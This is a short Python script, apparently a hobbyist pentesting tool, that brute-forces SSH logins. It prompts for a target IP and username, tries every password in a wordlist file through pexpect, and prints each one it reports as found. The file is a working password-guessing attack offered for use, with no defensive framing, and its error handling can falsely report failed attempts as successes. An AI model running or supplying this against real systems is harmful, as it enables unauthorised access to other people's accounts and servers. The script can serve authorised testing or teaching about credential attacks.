#!/usr/bin/env python3

import pexpect 
from termcolor import colored
import sys

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(user, host, password):
    ssh_newkey = "Are you sure you want to continue connection"
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error Connecting')
            return
    child.sendline(password)
    child.expect(PROMPT,timeout=0.5)
    return child


def main():
    host = input("[*] Enter Target IP To Bruteforce For SSH : ")
    user = input("[*] Enter Target Username : ")
    file = open('password.txt', 'r') #Change your wordlist
    for password in file.readlines():
        password = password.strip('\n')
        try:
            child = connect(user, host, password)
            print(colored("[+] Password Found : " + password, 'green'))
            
        except:
            print(colored("[-] Wrong Password : " + password , 'red'))

main()
